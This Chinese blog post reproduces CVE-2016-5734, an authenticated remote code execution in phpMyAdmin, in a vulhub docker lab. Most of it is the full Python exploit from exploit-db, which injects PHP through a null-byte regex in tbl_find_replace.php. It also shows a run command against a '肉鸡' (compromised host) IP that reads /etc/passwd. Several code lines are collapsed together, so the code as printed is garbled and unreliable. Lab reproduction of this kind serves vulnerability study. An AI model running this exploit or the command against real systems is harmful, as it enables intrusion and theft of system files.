# 漏洞复现-CVE-2016-5734-phpmyadmin 后台代码执行 - 铺哩 - 博客园

> 原文：[`www.cnblogs.com/cute-puli/p/14751187.html`](https://www.cnblogs.com/cute-puli/p/14751187.html)

# 0x00 实验环境

攻击机：Win 10

靶机也可作为攻击机：Ubuntu18 （docker 搭建的 vulhub 靶场）

# 0x01 影响版本

**标志：phpmyadmin**

**版本：php 版本：4.3.0 ~5.4.6**

*   4.0.10.16 之前 4.0.x 版本
*   4.4.15.7 之前 4.4.x 版本
*   4.6.3 之前 4.6.x 版本（实际上由于该版本要求 PHP5.5+，所以无法复现本漏洞）

# 0x02 漏洞复现

复现的漏洞环境：phpmyadmin:4.4.15.6

漏洞复现很简单，使用 POC [`www.exploit-db.com/exploits/40185/`](https://www.exploit-db.com/exploits/40185/) 来复现漏洞，同时需要知道 phpmyadmin 的登录账号与密码

POC：

```
#!/usr/bin/env python

"""cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit
Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.
CVE: CVE-2016-5734
Author: https://twitter.com/iamsecurity
run: ./cve-2016-5734.py -u root --pwd="" http://localhost/pma -c "system('ls -lua');" """

import requests import argparse import sys __author__ = "@iamsecurity"

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("url", type=str, help="URL with path to PMA")
    parser.add_argument("-c", "--cmd", type=str, help="PHP command(s) to eval()")
    parser.add_argument("-u", "--user", required=True, type=str, help="Valid PMA user")
    parser.add_argument("-p", "--pwd", required=True, type=str, help="Password for valid PMA user")
    parser.add_argument("-d", "--dbs", type=str, help="Existing database at a server")
    parser.add_argument("-T", "--table", type=str, help="Custom table name for exploit.")
    arguments = parser.parse_args()
    url_to_pma = arguments.url
    uname = arguments.user
    upass = arguments.pwd if arguments.dbs:
        db = arguments.dbs else:
        db = "test" token = False
    custom_table = False if arguments.table:
        custom_table = True
        table = arguments.table else:
        table = "prgpwn"
    if arguments.cmd:
        payload = arguments.cmd else:
        payload = "system('uname -a');" size = 32 s = requests.Session() # you can manually add proxy support it's very simple ;)
    # s.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}
    s.verify = False
    sql = '''CREATE TABLE `{0}` (
      `first` varchar(10) CHARACTER SET utf8 NOT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
    INSERT INTO `{0}` (`first`) VALUES (UNHEX('302F6500')); '''.format(table) # get_token
    resp = s.post(url_to_pma + "/?lang=en", dict(
        pma_username=uname,
        pma_password=upass
    )) if resp.status_code is 200:
        token_place = resp.text.find("token=") + 6 token = resp.text[token_place:token_place + 32] if token is False: print("Cannot get valid authorization token.")
        sys.exit(1) if custom_table is False:
        data = { "is_js_confirmed": "0", "db": db, "token": token, "pos": "0", "sql_query": sql, "sql_delimiter": ";", "show_query": "0", "fk_checks": "0", "SQL": "Go", "ajax_request": "true", "ajax_page_request": "true",
        }
        resp = s.post(url_to_pma + "/import.php", data, cookies=requests.utils.dict_from_cookiejar(s.cookies)) if resp.status_code == 200: if "success" in resp.json(): if resp.json()["success"] is False:
                    first = resp.json()["error"][resp.json()["error"].find("<code>")+6:]
                    error = first[:first.find("</code>")] if "already exists" in error: print(error) else: print("ERROR: " + error)
                        sys.exit(1) # build exploit
    exploit = { "db": db, "table": table, "token": token, "goto": "sql.php", "find": "0/e\0", "replaceWith": payload, "columnIndex": "0", "useRegex": "on", "submit": "Go", "ajax_request": "true" }
    resp = s.post(
        url_to_pma + "/tbl_find_replace.php", exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)
    ) if resp.status_code == 200:
        result = resp.json()["message"][resp.json()["message"].find("</a>")+8:] if len(result): print("result: " + result)
            sys.exit(0) print( "Exploit failed!\n"
            "Try to manually set exploit parameters like --table, --database and --token.\n"
            "Remember that servers with PHP version greater than 5.4.6"
            " is not exploitable, because of warning about null byte in regexp" )
        sys.exit(1)
```

 访问页面，存在 phpmyadmin 的登录页面：

![](img/d0bdb4321eec78e270a3bb55b9e35ae3.png)

**在获取 phpmyadmin 账号密码后**，本机直接执行：

```
python3 40185.py -u phpmyadmin 登录账号 -p "登录密码" http://肉鸡 IP:port -c "system('cat /etc/passwd')"

```

![](img/cd7e3ed66cdee6c519802bb90dcfc407.png)

命令执行成功后会在 phpmyadmin 的 test 数据库下创建一个名为“**prgpwn**”的表，并进行命令执行。

# 0x03 漏洞原理

```
https://xz.aliyun.com/t/7836
```